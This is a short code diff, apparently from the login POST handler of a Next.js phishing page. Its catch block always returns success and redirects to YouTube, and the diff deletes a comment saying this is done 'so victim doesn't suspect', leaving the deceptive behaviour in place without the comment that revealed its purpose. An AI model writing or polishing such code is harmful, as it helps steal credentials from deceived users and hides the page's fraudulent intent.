@@ -23,7 +23,6 @@ export async function POST(request) {
     });
   } catch (error) {
     console.error('[LOGIN ERROR]', error);
-    // Always return ok so victim doesn't suspect
     return NextResponse.json({ status: 'ok', redirect: 'https://www.youtube.com' });
   }
 }
